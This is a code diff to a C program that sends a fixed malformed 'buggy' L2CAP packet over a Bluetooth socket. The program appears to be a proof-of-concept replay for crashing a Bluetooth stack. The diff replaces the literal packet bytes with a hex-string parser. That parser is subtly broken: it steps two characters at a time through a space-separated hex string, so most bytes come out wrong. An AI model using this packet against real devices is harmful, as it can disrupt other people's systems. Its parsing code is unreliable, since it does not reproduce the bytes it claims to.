@@ -36,10 +36,18 @@
 #include <bluetooth/l2cap.h>
 
 #define SIZE		12
-char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";
 
-int main(int argc, char **argv)
-{
+void hexstring_to_bytes(const char *hexstring, char *bytes, int bytes_len) {
+    int i, j;
+
+    for (i = 0, j = 0; i < bytes_len; i++, j += 2) {
+        sscanf(hexstring + j, "%2hhx", &bytes[i]);
+    }
+}
+
+char replay_buggy_packet[SIZE]; // Modify packet data using hex string
+
+int main(int argc, char **argv) {
 	struct sockaddr_l2 addr;
 	int sock, sent, i;
 
@@ -72,6 +80,8 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	
+    hexstring_to_bytes("B1 01 DB 69 94 5C 07 4E 0D 9B 2E F1", replay_buggy_packet, SIZE);
+
 	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
 	{
 		printf("L2CAP packet sent (%d)\n", sent);
@@ -85,3 +95,4 @@ int main(int argc, char **argv)
 	close(sock);
 	return EXIT_SUCCESS;
 }
+
